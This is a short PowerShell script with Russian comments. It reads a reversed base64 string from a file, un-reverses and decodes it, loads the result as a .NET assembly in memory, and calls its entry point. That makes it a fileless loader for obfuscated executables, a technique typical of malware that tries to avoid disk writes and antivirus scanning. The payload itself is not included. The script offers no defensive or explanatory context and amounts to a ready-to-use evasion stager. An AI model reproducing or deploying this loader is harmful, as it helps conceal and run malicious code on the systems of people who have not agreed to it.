﻿# Путь к файлу с перевёрнутым base64
$path = "base64.txt"

# Читаем base64 из файла
$base64 = Get-Content -Path $path -Raw

# Разворачиваем строку обратно
$chars = $base64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars

# Декодируем в байты
$bytes = [System.Convert]::FromBase64String($fixedBase64)

# Загружаем в память как .NET Assembly
$asm = [System.Reflection.Assembly]::Load($bytes)

# Если exe содержит точку входа Main, вызываем её
$entry = $asm.EntryPoint
if ($entry) {
    $entry.Invoke($null, @([string[]]@()))
} else {
    Write-Host "Assembly не содержит точку входа."
}
